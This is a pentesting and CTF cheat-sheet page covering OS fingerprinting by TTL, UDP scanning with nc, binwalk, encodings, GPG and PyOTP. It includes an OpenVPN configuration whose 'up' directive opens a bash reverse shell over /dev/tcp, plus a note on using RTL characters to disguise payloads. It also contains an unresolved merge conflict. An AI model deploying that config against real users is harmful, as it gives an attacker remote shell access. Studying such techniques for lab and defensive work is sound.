# MISC

In a ping response TTL:\
127 = Windows\
254 = Cisco\
Lo demás,algunlinux

$1$- md5\
$2$or $2a$ - Blowfish\
$5$- sha256\
$6$- sha512

If you do not know what is behind a service, try to make and HTTP GET request.

**UDP Scans**\
nc -nv -u -z -w 1 \<IP> 160-16

An empty UDP packet is sent to a specific port. If the UDP port is open, no reply is sent back from the target machine. If the UDP port is closed, an ICMP port unreachable packet should be sent back from the target machine.\\

UDP port scanning is often unreliable, as firewalls and routers may drop ICMP\
<<<<<<< HEAD
&#x20;packets. This can lead to false positives in your scan, and you will regularly see\
&#x20;UDP port scans showing all UDP ports open on a scanned machine.\
&#x20;o Most port scanners do not scan all available ports, and usually have a preset list\
&#x20;of “interesting ports” that are scanned.
=======
packets. This can lead to false positives in your scan, and you will regularly see\
UDP port scans showing all UDP ports open on a scanned machine.\
o Most port scanners do not scan all available ports, and usually have a preset list\
of “interesting ports” that are scanned.
>>>>>>> master

## CTF - Tricks

In **Windows** use **Winzip** to search for files.\
**Alternate data Streams**: _dir /r | find ":$DATA"_\\

```
binwalk --dd=".*" <file> #Extract everything
binwalk -M -e -d=10000 suspicious.pdf #Extract, look inside extracted files and continue extracing (depth of 10000)
```

### Crypto

**featherduster**\\

**Basae64**(6—>8) —> 0...9, a...z, A…Z,+,/\
**Base32**(5 —>8) —> A…Z, 2…7\
**Base85** (Ascii85, 7—>8) —> 0...9, a...z, A...Z, ., -, :, +, =, ^, !, /, \*, ?, &, <, >, (, ), \[, ], {, }, @, %, $, #\
**Uuencode** --> Start with "_begin \<mode> \<filename>_" and weird chars\
**Xxencoding** --> Start with "_begin \<mode> \<filename>_" and B64\
\
**Vigenere** (frequency analysis) —> [https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver)\
**Scytale** (offset of characters) —> [https://www.dcode.fr/scytale-cipher](https://www.dcode.fr/scytale-cipher)

**25x25 = QR**

factordb.com\
rsatool

Snow --> Hide messages using spaces and tabs

## Characters

%E2%80%AE => RTL Character (writes payloads backwards)



## Openvpn Configuration to Shell

```bash
remote 192.168.122.1
nobind
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/9000<&1 2>&1&'"
```

## GPG keys&#x20;

Dump informations about the key:

```
gpg -d file.gpg
```

List keys owned by the user

```
gpg --list-keys
```

### PYOTP

Building a Python Script to generate TOTP for MFA (the NTPDate failed because i didn't use -q. Nmap would have worked with -sV)

{% embed url="https://github.com/pyauth/pyotp" %}
PyOTP is a Python library for generating and verifying one-time passwords. It can be used to implement two-factor (2FA) or multi-factor (MFA) authentication methods in web applications and in other systems that require users to log in.
{% endembed %}

